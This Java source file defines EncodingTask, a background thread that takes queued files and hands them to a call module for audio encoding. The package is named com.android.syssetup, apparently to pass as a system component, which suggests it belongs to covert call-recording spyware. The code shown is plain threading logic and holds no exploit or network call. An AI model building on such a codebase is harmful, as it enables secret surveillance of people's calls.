package com.android.syssetup.module.call;

import java.util.concurrent.BlockingQueue;

import com.android.syssetup.ProcessInfo;
import com.android.syssetup.auto.Cfg;
import com.android.syssetup.file.AutoFile;
import com.android.syssetup.interfaces.Observer;
import com.android.syssetup.listener.ListenerProcess;
import com.android.syssetup.module.ModuleCall;
import com.android.syssetup.util.Check;

public class EncodingTask implements Runnable, Observer<ProcessInfo> {
	/**
	 * 
	 */
	private static final String TAG = "EncodingTask";
	
	private final ModuleCall moduleCall;
	Object sync;
	BlockingQueue<String> queue;
	boolean stopQueueMonitor;

	public EncodingTask(ModuleCall moduleCall, Object t, BlockingQueue<String> l) {
		this.moduleCall = moduleCall;
		sync = t;
		queue = l;
		ListenerProcess.self().attach(this);
	}

	public void stop() {
		stopQueueMonitor = true;
		ListenerProcess.self().detach(this);
		wake();

	}

	public void wake() {
		synchronized (sync) {
			try {
				sync.notify();
			} catch (IllegalMonitorStateException e){
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}
			}
		}
	}

	public void run() {
		while (true) {
			synchronized (sync) {
				try {
					sync.wait();
				} catch (InterruptedException e) {
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}
				} catch (IllegalMonitorStateException e){
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}
				}
			}

			if (stopQueueMonitor) {
				if (Cfg.DEBUG) {
					Check.log(TAG + "(EncodingTask run): killing audio encoding thread");

				}
				return;
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + "(EncodingTask run): thread awoken, time to encode");
			}

			// Browse lists and check if an encoding is already in
			// progress
			try {
				while (queue.isEmpty() == false) {
					String fileQueue = queue.take();
					AutoFile file = new AutoFile(fileQueue);
					// Check if end of conversation
					if (Cfg.DEBUG) {
						Check.log(TAG + "(EncodingTask run): decoding " + file.getName());
					}

		
					this.moduleCall.encodeChunks(file);

				}
			} catch (Exception e) {
				if (Cfg.EXCEPTION) {
					Check.log(e);
				}
			}

		}
	}

	@Override
	public int notification(ProcessInfo b) {
		return 0;
	}
}